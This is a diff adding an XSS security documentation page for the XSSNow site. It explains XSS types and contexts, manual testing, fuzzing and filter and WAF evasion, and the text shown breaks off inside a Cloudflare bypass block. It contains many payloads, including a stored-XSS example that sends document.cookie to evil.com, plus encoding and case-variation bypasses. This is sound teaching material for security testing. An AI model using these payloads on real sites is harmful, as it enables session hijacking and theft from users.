@@ -1,0 +1,1506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🥷 XSSNow - Complete XSS Security Documentation & Learning Guide</title>
+    <meta name="description" content="Comprehensive guide to Cross-Site Scripting (XSS) vulnerabilities, WAF bypass techniques, prevention methods, and security research. Learn XSS from basics to advanced exploitation.">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="XSSNow - XSS Security Documentation">
+    <meta property="og:description" content="Comprehensive guide to Cross-Site Scripting vulnerabilities, bypass techniques, and prevention methods for security researchers.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xssnow.in/docs.html">
+    <meta property="og:image" content="https://xssnow.in/assets/xss_now_logo.png">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="XSSNow - XSS Security Documentation">
+    <meta name="twitter:description" content="Learn XSS from basics to advanced exploitation with comprehensive documentation.">
+
+    <!-- Additional SEO -->
+    <meta name="keywords" content="XSS Documentation, Cross-Site Scripting Guide, XSS Learning, Security Education, Web Security, XSS Prevention">
+    <link rel="canonical" href="https://xssnow.in/docs.html">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="assets/ninja.svg">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <!-- Highlight.js for syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/animations.css">
+    <link rel="stylesheet" href="css/components.css">
+    <link rel="stylesheet" href="css/docs.css">
+    <link rel="stylesheet" href="css/docs-extended.css">
+    <link rel="stylesheet" href="css/seo-components.css">
+</head>
+<body>
+    <!-- Matrix Background Animation -->
+    <div id="matrix-bg"></div>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <a href="index.html" style="display: flex; align-items: center; gap: 0.5rem; text-decoration: none; color: var(--neon-green);">
+                    <i class="fas fa-user-ninja" style="color: var(--neon-green);"></i>
+                    <span class="brand-text" style="color: var(--neon-green);">XSSNow</span>
+                    <span class="version">v1.0</span>
+                </a>
+            </div>
+
+            <div class="nav-menu">
+                <a href="index.html" class="nav-link">Home</a>
+                <a href="payloads.html" class="nav-link">Payloads</a>
+                <a href="xss-payload-generator.html" class="nav-link">Generator</a>
+                <a href="contributors.html" class="nav-link">Contributors</a>
+                <a href="docs.html" class="nav-link active">Docs</a>
+            </div>
+
+            <div class="nav-actions">
+                <a href="https://github.com/dr34mhacks/xssnow" class="github-btn" target="_blank">
+                    <i class="fab fa-github"></i>
+                    <span>Fork & Contribute</span>
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <main id="main-content" class="docs-interface">
+        <!-- Sidebar Table of Contents -->
+        <div class="docs-sidebar">
+            <div class="sidebar-header">
+                <h2>📚 Documentation</h2>
+                <div class="reading-progress">
+                    <div class="progress-bar" id="readingProgress"></div>
+                </div>
+            </div>
+
+            <nav class="docs-nav">
+                <ul class="nav-sections">
+                    <li class="nav-section">
+                        <a href="#introduction" class="nav-link active">
+                            <i class="fas fa-play-circle"></i>
+                            Introduction
+                        </a>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#fundamentals" class="nav-link">
+                            <i class="fas fa-book"></i>
+                            XSS Fundamentals
+                        </a>
+                        <ul class="nav-subsections">
+                            <li><a href="#what-is-xss">What is XSS?</a></li>
+                            <li><a href="#types-of-xss">Types of XSS</a></li>
+                            <li><a href="#xss-execution-contexts">Execution Contexts</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#detection-techniques" class="nav-link">
+                            <i class="fas fa-search"></i>
+                            Detection Techniques
+                        </a>
+                        <ul class="nav-subsections">
+                            <li><a href="#manual-testing">Manual Testing</a></li>
+                            <li><a href="#automated-scanning">Automated Scanning</a></li>
+                            <li><a href="#fuzzing-strategies">Fuzzing Strategies</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#bypass-techniques" class="nav-link">
+                            <i class="fas fa-shield-alt"></i>
+                            Bypass Techniques
+                        </a>
+                        <ul class="nav-subsections">
+                            <li><a href="#filter-evasion">Filter Evasion</a></li>
+                            <li><a href="#waf-bypasses">WAF Bypasses</a></li>
+                            <li><a href="#csp-bypasses">CSP Bypasses</a></li>
+                            <li><a href="#encoding-tricks">Encoding Tricks</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#exploitation" class="nav-link">
+                            <i class="fas fa-bug"></i>
+                            Exploitation
+                        </a>
+                        <ul class="nav-subsections">
+                            <li><a href="#session-hijacking">Session Hijacking</a></li>
+                            <li><a href="#phishing-attacks">Phishing Attacks</a></li>
+                            <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#prevention" class="nav-link">
+                            <i class="fas fa-lock"></i>
+                            Prevention
+                        </a>
+                        <ul class="nav-subsections">
+                            <li><a href="#input-validation">Input Validation</a></li>
+                            <li><a href="#output-encoding">Output Encoding</a></li>
+                            <li><a href="#csp-implementation">CSP Implementation</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#tools-resources" class="nav-link">
+                            <i class="fas fa-tools"></i>
+                            Tools & Resources
+                        </a>
+                    </li>
+                    <li class="nav-section">
+                        <a href="#references" class="nav-link">
+                            <i class="fas fa-external-link-alt"></i>
+                            References
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+
+        <!-- Main Documentation Content -->
+        <div class="docs-content">
+            <!-- Introduction Section -->
+            <section id="introduction" class="doc-section">
+                <div class="section-hero">
+                    <h1 class="section-title">
+                        🛡️ Complete XSS Security Guide
+                    </h1>
+                    <p class="section-subtitle">
+                        Master Cross-Site Scripting vulnerabilities, bypass techniques, and defense strategies
+                    </p>
+                    <div class="hero-animation">
+                        <div class="animated-code-block" id="heroAnimation">
+                            <div class="typing-demo">
+                                <span class="typed-text" id="typedText"></span>
+                                <span class="cursor">|</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="content-grid">
+                    <div class="intro-card">
+                        <div class="card-icon">🎯</div>
+                        <h3>Purpose</h3>
+                        <p>This documentation provides comprehensive coverage of XSS vulnerabilities, from basic concepts to advanced exploitation techniques.</p>
+                    </div>
+                    <div class="intro-card">
+                        <div class="card-icon">🔬</div>
+                        <h3>Research-Focused</h3>
+                        <p>Based on latest security research, bug bounty findings, and real-world penetration testing scenarios.</p>
+                    </div>
+                    <div class="intro-card">
+                        <div class="card-icon">⚖️</div>
+                        <h3>Ethical Use</h3>
+                        <p>All techniques documented here are for educational purposes and authorized security testing only.</p>
+                    </div>
+                    <div class="intro-card">
+                        <div class="card-icon">🚀</div>
+                        <h3>Practical Focus</h3>
+                        <p>Hands-on examples, real-world scenarios, and actionable defensive strategies for security professionals.</p>
+                    </div>
+                </div>
+
+                <div class="disclaimer-box">
+                    <h4>⚠️ Important Notice</h4>
+                    <p><strong>Educational Purpose:</strong> This documentation is for authorized security testing and educational use only. Always obtain proper written authorization before testing any systems.</p>
+                </div>
+            </section>
+
+            <!-- XSS Fundamentals Section -->
+            <section id="fundamentals" class="doc-section">
+                <h2 class="section-title">📖 XSS Fundamentals</h2>
+
+                <div id="what-is-xss" class="subsection">
+                    <h3>What is Cross-Site Scripting (XSS)?</h3>
+                    <p>Cross-Site Scripting (XSS) is a type of security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When the victim loads the page, the malicious script executes in their browser, potentially allowing the attacker to:</p>
+
+                    <div class="impact-grid">
+                        <div class="impact-item">
+                            <i class="fas fa-key"></i>
+                            <h4>Steal Session Cookies</h4>
+                            <p>Access authentication tokens and hijack user sessions</p>
+                        </div>
+                        <div class="impact-item">
+                            <i class="fas fa-user-secret"></i>
+                            <h4>Perform Actions as User</h4>
+                            <p>Execute any action the user can perform on the website</p>
+                        </div>
+                        <div class="impact-item">
+                            <i class="fas fa-eye"></i>
+                            <h4>Access Sensitive Data</h4>
+                            <p>Read private information displayed on the page</p>
+                        </div>
+                        <div class="impact-item">
+                            <i class="fas fa-fish"></i>
+                            <h4>Phishing Attacks</h4>
+                            <p>Display fake forms to capture credentials</p>
+                        </div>
+                        <div class="impact-item">
+                            <i class="fas fa-code"></i>
+                            <h4>Malicious Redirects</h4>
+                            <p>Redirect users to malicious websites or download malware</p>
+                        </div>
+                        <div class="impact-item">
+                            <i class="fas fa-network-wired"></i>
+                            <h4>Network Reconnaissance</h4>
+                            <p>Scan internal networks and gather system information</p>
+                        </div>
+                    </div>
+
+                    <div class="demo-container">
+                        <h4>Interactive XSS Demo</h4>
+                        <div class="xss-demo" id="xssDemo">
+                            <div class="demo-input">
+                                <label>Enter your name:</label>
+                                <input type="text" id="userInput" placeholder="Try: <script>alert('XSS')</script>">
+                                <button onclick="simulateXSS()">Submit</button>
+                            </div>
+                            <div class="demo-output" id="demoOutput">
+                                Welcome! Your output will appear here...
+                            </div>
+                        </div>
+                        <p class="demo-note">⚠️ This is a safe simulation - no actual XSS execution occurs</p>
+                    </div>
+                </div>
+
+                <div id="types-of-xss" class="subsection">
+                    <h3>Types of XSS Vulnerabilities</h3>
+
+                    <div class="xss-types">
+                        <div class="xss-type-card reflected">
+                            <div class="type-header">
+                                <h4>🔄 Reflected XSS</h4>
+                                <span class="severity high">High Risk</span>
+                            </div>
+                            <p>The malicious script is reflected off the web server as part of the response. The payload is typically delivered via URL parameters or form submissions.</p>
+
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Vulnerable Code Example</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-html">&lt;!-- Vulnerable PHP code --&gt;
+&lt;h1&gt;Welcome &lt;?php echo $_GET['name']; ?&gt;!&lt;/h1&gt;
+
+&lt;!-- Malicious URL --&gt;
+https://example.com/welcome.php?name=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                            </div>
+
+                            <div class="attack-flow">
+                                <div class="flow-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <h5>Attacker crafts malicious URL</h5>
+                                        <p>Creates a URL with XSS payload in parameters</p>
+                                    </div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <h5>Victim clicks malicious link</h5>
+                                        <p>Social engineering or phishing email</p>
+                                    </div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <h5>Server reflects payload</h5>
+                                        <p>Payload included in server response</p>
+                                    </div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step">
+                                    <div class="step-number">4</div>
+                                    <div class="step-content">
+                                        <h5>Script executes in browser</h5>
+                                        <p>Malicious code runs in victim's browser</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="xss-type-card stored">
+                            <div class="type-header">
+                                <h4>💾 Stored XSS</h4>
+                                <span class="severity critical">Critical Risk</span>
+                            </div>
+                            <p>The malicious script is permanently stored on the target server (database, file system, etc.) and served to users when they access the affected page.</p>
+
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Vulnerable Comment System</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-html">&lt;!-- Vulnerable comment display --&gt;
+&lt;div class="comment"&gt;
+    &lt;h4&gt;&lt;?php echo $comment['author']; ?&gt;&lt;/h4&gt;
+    &lt;p&gt;&lt;?php echo $comment['message']; ?&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;!-- Malicious comment payload --&gt;
+Author: &lt;script&gt;document.location='http://evil.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></pre>
+                            </div>
+
+                            <div class="stored-xss-timeline">
+                                <div class="timeline-item">
+                                    <div class="timeline-dot"></div>
+                                    <div class="timeline-content">
+                                        <h5>Payload Injection</h5>
+                                        <p>Attacker submits malicious script via form</p>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-dot"></div>
+                                    <div class="timeline-content">
+                                        <h5>Storage</h5>
+                                        <p>Malicious script stored in database</p>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-dot"></div>
+                                    <div class="timeline-content">
+                                        <h5>Victim Access</h5>
+                                        <p>Any user visiting the page triggers XSS</p>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-dot"></div>
+                                    <div class="timeline-content">
+                                        <h5>Persistent Impact</h5>
+                                        <p>Affects multiple users over time</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="xss-type-card dom-based">
+                            <div class="type-header">
+                                <h4>🌐 DOM-Based XSS</h4>
+                                <span class="severity high">High Risk</span>
+                            </div>
+                            <p>The vulnerability exists in client-side JavaScript code. The payload modifies the DOM environment without requiring server interaction.</p>
+
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Vulnerable JavaScript Code</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-javascript">// Vulnerable DOM manipulation
+var name = location.hash.substring(1);
+document.getElementById('welcome').innerHTML = 'Hello ' + name;
+
+// Malicious URL
+https://example.com/page.html#&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                            </div>
+
+                            <div class="dom-sources-sinks">
+                                <div class="sources-section">
+                                    <h5>🔍 Common Sources</h5>
+                                    <ul class="source-list">
+                                        <li><code>location.href</code></li>
+                                        <li><code>location.search</code></li>
+                                        <li><code>location.hash</code></li>
+                                        <li><code>document.referrer</code></li>
+                                        <li><code>window.name</code></li>
+                                        <li><code>postMessage data</code></li>
+                                    </ul>
+                                </div>
+                                <div class="sinks-section">
+                                    <h5>🎯 Common Sinks</h5>
+                                    <ul class="sink-list">
+                                        <li><code>innerHTML</code></li>
+                                        <li><code>outerHTML</code></li>
+                                        <li><code>document.write()</code></li>
+                                        <li><code>eval()</code></li>
+                                        <li><code>setTimeout()</code></li>
+                                        <li><code>location.href</code></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="xss-execution-contexts" class="subsection">
+                    <h3>XSS Execution Contexts</h3>
+                    <p>Understanding where your payload will be executed is crucial for crafting effective XSS attacks. Different contexts require different approaches:</p>
+
+                    <div class="context-tabs">
+                        <div class="tab-buttons">
+                            <button class="tab-button active" onclick="showContext('html')">HTML Context</button>
+                            <button class="tab-button" onclick="showContext('attribute')">Attribute Context</button>
+                            <button class="tab-button" onclick="showContext('javascript')">JavaScript Context</button>
+                            <button class="tab-button" onclick="showContext('css')">CSS Context</button>
+                            <button class="tab-button" onclick="showContext('url')">URL Context</button>
+                        </div>
+
+                        <div class="tab-content">
+                            <div class="context-panel active" id="html-context">
+                                <h4>HTML Context</h4>
+                                <p>Payload is reflected directly into HTML content:</p>
+                                <div class="context-example">
+                                    <div class="example-vulnerable">
+                                        <h5>Vulnerable:</h5>
+                                        <pre><code>&lt;div&gt;Hello $userInput&lt;/div&gt;</code></pre>
+                                    </div>
+                                    <div class="example-payload">
+                                        <h5>Payload:</h5>
+                                        <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                                    </div>
+                                    <div class="example-result">
+                                        <h5>Result:</h5>
+                                        <pre><code>&lt;div&gt;Hello &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="context-panel" id="attribute-context">
+                                <h4>Attribute Context</h4>
+                                <p>Payload is reflected inside HTML attributes:</p>
+                                <div class="context-example">
+                                    <div class="example-vulnerable">
+                                        <h5>Vulnerable:</h5>
+                                        <pre><code>&lt;input type="text" value="$userInput"&gt;</code></pre>
+                                    </div>
+                                    <div class="example-payload">
+                                        <h5>Payload:</h5>
+                                        <pre><code>" onmouseover="alert('XSS')</code></pre>
+                                    </div>
+                                    <div class="example-result">
+                                        <h5>Result:</h5>
+                                        <pre><code>&lt;input type="text" value="" onmouseover="alert('XSS')"&gt;</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="context-panel" id="javascript-context">
+                                <h4>JavaScript Context</h4>
+                                <p>Payload is reflected inside JavaScript code:</p>
+                                <div class="context-example">
+                                    <div class="example-vulnerable">
+                                        <h5>Vulnerable:</h5>
+                                        <pre><code>&lt;script&gt;var name = '$userInput';&lt;/script&gt;</code></pre>
+                                    </div>
+                                    <div class="example-payload">
+                                        <h5>Payload:</h5>
+                                        <pre><code>';alert('XSS');//</code></pre>
+                                    </div>
+                                    <div class="example-result">
+                                        <h5>Result:</h5>
+                                        <pre><code>&lt;script&gt;var name = '';alert('XSS');//';&lt;/script&gt;</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="context-panel" id="css-context">
+                                <h4>CSS Context</h4>
+                                <p>Payload is reflected inside CSS styles:</p>
+                                <div class="context-example">
+                                    <div class="example-vulnerable">
+                                        <h5>Vulnerable:</h5>
+                                        <pre><code>&lt;style&gt;body { background: $userColor; }&lt;/style&gt;</code></pre>
+                                    </div>
+                                    <div class="example-payload">
+                                        <h5>Payload:</h5>
+                                        <pre><code>red; } &lt;/style&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                                    </div>
+                                    <div class="example-result">
+                                        <h5>Result:</h5>
+                                        <pre><code>&lt;style&gt;body { background: red; } &lt;/style&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;; }&lt;/style&gt;</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="context-panel" id="url-context">
+                                <h4>URL Context</h4>
+                                <p>Payload is reflected in URLs or href attributes:</p>
+                                <div class="context-example">
+                                    <div class="example-vulnerable">
+                                        <h5>Vulnerable:</h5>
+                                        <pre><code>&lt;a href="$userURL"&gt;Click here&lt;/a&gt;</code></pre>
+                                    </div>
+                                    <div class="example-payload">
+                                        <h5>Payload:</h5>
+                                        <pre><code>javascript:alert('XSS')</code></pre>
+                                    </div>
+                                    <div class="example-result">
+                                        <h5>Result:</h5>
+                                        <pre><code>&lt;a href="javascript:alert('XSS')"&gt;Click here&lt;/a&gt;</code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Detection Techniques Section -->
+            <section id="detection-techniques" class="doc-section">
+                <h2 class="section-title">🔍 XSS Detection Techniques</h2>
+
+                <div id="manual-testing" class="subsection">
+                    <h3>Manual Testing Strategies</h3>
+                    <p>Manual testing remains one of the most effective ways to discover XSS vulnerabilities. Here are proven strategies:</p>
+
+                    <div class="testing-methodology">
+                        <div class="method-card">
+                            <h4>🎯 Input Point Identification</h4>
+                            <ul class="method-list">
+                                <li>URL parameters (<code>?param=value</code>)</li>
+                                <li>Form fields (text inputs, textareas, hidden fields)</li>
+                                <li>HTTP headers (User-Agent, Referer, X-Forwarded-For)</li>
+                                <li>File uploads (filename, metadata)</li>
+                                <li>API endpoints and JSON data</li>
+                                <li>Cookie values</li>
+                            </ul>
+                        </div>
+
+                        <div class="method-card">
+                            <h4>🧪 Basic Payload Testing</h4>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Progressive Testing Approach</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code># 1. Start with simple HTML
+&lt;h1&gt;test&lt;/h1&gt;
+
+# 2. Test script execution
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# 3. Event handlers
+&lt;img src=x onerror=alert(1)&gt;
+
+# 4. Context breaking
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+# 5. Advanced payloads
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="automated-scanning" class="subsection">
+                    <h3>Automated Scanning Tools</h3>
+                    <p>Automated scanners can help identify XSS vulnerabilities at scale, but manual testing is still essential for comprehensive coverage:</p>
+
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🕷️ Web Application Scanners</h4>
+                            <ul>
+                                <li><strong>Burp Suite Professional</strong> - Industry standard web application security testing platform</li>
+                                <li><strong>OWASP ZAP</strong> - Free and open-source security testing proxy</li>
+                                <li><strong>Acunetix</strong> - Commercial vulnerability scanner with advanced crawling</li>
+                                <li><strong>Netsparker</strong> - Automated security scanner with proof-of-concept verification</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>⚡ Specialized XSS Tools</h4>
+                            <ul>
+                                <li><strong>XSSStrike</strong> - Advanced XSS detection suite with fuzzing capabilities</li>
+                                <li><strong>XSSHunter</strong> - Blind XSS detection platform for stored vulnerabilities</li>
+                                <li><strong>XSSer</strong> - Automatic XSS detection and exploitation framework</li>
+                                <li><strong>Dalfox</strong> - Fast and powerful XSS scanner and parameter analysis tool</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="scanning-tips">
+                        <h4>💡 Best Practices for Automated Scanning</h4>
+                        <div class="tips-grid">
+                            <div class="tip-item">
+                                <h5>🎯 Configure Scope Properly</h5>
+                                <p>Define clear testing boundaries and exclude production systems from aggressive scans.</p>
+                            </div>
+                            <div class="tip-item">
+                                <h5>🔄 Combine Multiple Tools</h5>
+                                <p>Different scanners have different strengths - use multiple tools for comprehensive coverage.</p>
+                            </div>
+                            <div class="tip-item">
+                                <h5>👥 Manual Validation</h5>
+                                <p>Always manually verify automated findings to reduce false positives and understand impact.</p>
+                            </div>
+                            <div class="tip-item">
+                                <h5>🕒 Timing Considerations</h5>
+                                <p>Use appropriate delays between requests to avoid overwhelming target applications.</p>
+                            </div>
+                            <div class="tip-item">
+                                <h5>📝 Document Findings</h5>
+                                <p>Maintain detailed logs of scan results and methodologies for compliance and reporting.</p>
+                            </div>
+                            <div class="tip-item">
+                                <h5>🔄 Regular Updates</h5>
+                                <p>Keep scanning tools and payloads updated to detect latest vulnerabilities and bypass techniques.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="fuzzing-strategies" class="subsection">
+                    <h3>Fuzzing Strategies</h3>
+                    <p>Fuzzing is an automated testing technique that involves sending unexpected, random, or malformed data to find XSS vulnerabilities:</p>
+
+                    <div class="fuzzing-approaches">
+                        <div class="fuzzing-method">
+                            <h4>🎲 Random Payload Fuzzing</h4>
+                            <p>Generate random payloads with varying characteristics:</p>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>Python Fuzzing Example</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-python"># XSS Fuzzing Script
+import random
+import string
+
+class XSSFuzzer:
+    def __init__(self):
+        self.tags = ['script', 'img', 'svg', 'iframe', 'input', 'body']
+        self.events = ['onload', 'onerror', 'onclick', 'onmouseover']
+        self.payloads = ['alert(1)', 'confirm(1)', 'prompt(1)']
+
+    def generate_random_payload(self):
+        tag = random.choice(self.tags)
+        event = random.choice(self.events)
+        payload = random.choice(self.payloads)
+        return f'&lt;{tag} {event}={payload}&gt;'
+
+    def generate_encoded_payload(self, payload):
+        # URL encoding
+        return ''.join(f'%{ord(c):02x}' for c in payload)
+
+    def fuzz_endpoint(self, url, param):
+        payloads = []
+        for _ in range(100):
+            base_payload = self.generate_random_payload()
+            payloads.extend([
+                base_payload,
+                self.generate_encoded_payload(base_payload),
+                base_payload.upper(),
+                base_payload.replace('&lt;', '&amp;lt;'),
+            ])
+        return payloads</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="fuzzing-method">
+                            <h4>🧬 Mutation-Based Fuzzing</h4>
+                            <p>Start with known working payloads and mutate them:</p>
+                            <div class="mutation-examples">
+                                <div class="mutation-type">
+                                    <h5>Character Insertion</h5>
+                                    <code>&lt;scri\x00pt&gt;alert(1)&lt;/script&gt;</code>
+                                </div>
+                                <div class="mutation-type">
+                                    <h5>Case Randomization</h5>
+                                    <code>&lt;ScRiPt&gt;aLeRt(1)&lt;/ScRiPt&gt;</code>
+                                </div>
+                                <div class="mutation-type">
+                                    <h5>Whitespace Injection</h5>
+                                    <code>&lt;script\x20&gt;alert(1)&lt;/script&gt;</code>
+                                </div>
+                                <div class="mutation-type">
+                                    <h5>Comment Insertion</h5>
+                                    <code>&lt;script&gt;/**/alert(1)&lt;/script&gt;</code>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="fuzzing-method">
+                            <h4>🎯 Context-Aware Fuzzing</h4>
+                            <p>Tailor payloads to specific injection contexts:</p>
+                            <div class="context-fuzzing">
+                                <div class="context-fuzz-item">
+                                    <h5>HTML Attribute Context</h5>
+                                    <code>" autofocus onfocus=alert(1) x="</code>
+                                    <br><code>' autofocus onfocus=alert(1) x='</code>
+                                </div>
+                                <div class="context-fuzz-item">
+                                    <h5>JavaScript String Context</h5>
+                                    <code>';alert(1);//</code>
+                                    <br><code>';alert(1);/*</code>
+                                </div>
+                                <div class="context-fuzz-item">
+                                    <h5>URL Parameter Context</h5>
+                                    <code>javascript:alert(1)</code>
+                                    <br><code>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Bypass Techniques Section -->
+            <section id="bypass-techniques" class="doc-section">
+                <h2 class="section-title">🛡️ Advanced Bypass Techniques</h2>
+
+                <div id="filter-evasion" class="subsection">
+                    <h3>Filter Evasion Techniques</h3>
+
+                    <div class="bypass-category">
+                        <h4>🎭 Case Manipulation</h4>
+                        <p>Many filters check for exact case matches and can be bypassed with case variations:</p>
+                        <div class="code-example">
+                            <pre><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+&lt;script &gt;alert(1)&lt;/script&gt;
+&lt;script	&gt;alert(1)&lt;/script&gt;
+&lt;script
+&gt;alert(1)&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="bypass-category">
+                        <h4>🔤 Encoding Bypass</h4>
+                        <p>Various encoding techniques can bypass input validation:</p>
+                        <div class="encoding-examples">
+                            <div class="encoding-type">
+                                <h5>URL Encoding</h5>
+                                <code>%3Cscript%3Ealert(1)%3C/script%3E</code>
+                            </div>
+                            <div class="encoding-type">
+                                <h5>HTML Entity Encoding</h5>
+                                <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>
+                            </div>
+                            <div class="encoding-type">
+                                <h5>Unicode Encoding</h5>
+                                <code>\u003cscript\u003ealert(1)\u003c/script\u003e</code>
+                            </div>
+                            <div class="encoding-type">
+                                <h5>Hex Encoding</h5>
+                                <code>\x3cscript\x3ealert(1)\x3c/script\x3e</code>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bypass-category">
+                        <h4>🧩 Alternative Event Handlers</h4>
+                        <p>When common event handlers are blocked, try these alternatives:</p>
+                        <div class="event-grid">
+                            <div class="event-category">
+                                <h5>Mouse Events</h5>
+                                <ul class="event-list">
+                                    <li><code>onmouseover</code></li>
+                                    <li><code>onmouseout</code></li>
+                                    <li><code>onmousedown</code></li>
+                                    <li><code>onmouseup</code></li>
+                                    <li><code>onclick</code></li>
+                                    <li><code>ondblclick</code></li>
+                                </ul>
+                            </div>
+                            <div class="event-category">
+                                <h5>Keyboard Events</h5>
+                                <ul class="event-list">
+                                    <li><code>onkeydown</code></li>
+                                    <li><code>onkeyup</code></li>
+                                    <li><code>onkeypress</code></li>
+                                </ul>
+                            </div>
+                            <div class="event-category">
+                                <h5>Form Events</h5>
+                                <ul class="event-list">
+                                    <li><code>onfocus</code></li>
+                                    <li><code>onblur</code></li>
+                                    <li><code>onchange</code></li>
+                                    <li><code>onsubmit</code></li>
+                                </ul>
+                            </div>
+                            <div class="event-category">
+                                <h5>Other Events</h5>
+                                <ul class="event-list">
+                                    <li><code>onload</code></li>
+                                    <li><code>onerror</code></li>
+                                    <li><code>onresize</code></li>
+                                    <li><code>onscroll</code></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="waf-bypasses" class="subsection">
+                    <h3>WAF Bypass Techniques</h3>
+                    <p>Web Application Firewalls (WAFs) implement various rules to block XSS attacks. Here are proven bypass techniques:</p>
+
+                    <div class="waf-bypasses">
+                        <div class="waf-card cloudflare">
+                            <h4>☁️ Cloudflare Bypasses</h4>
+                            <div class="code-example">
+                                <pre><code># Unicode bypass
+&lt;script&gt;alert\u0028\u0031\u0029&lt;/script&gt;
+
+# Case variation
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+
+# Encoding combination
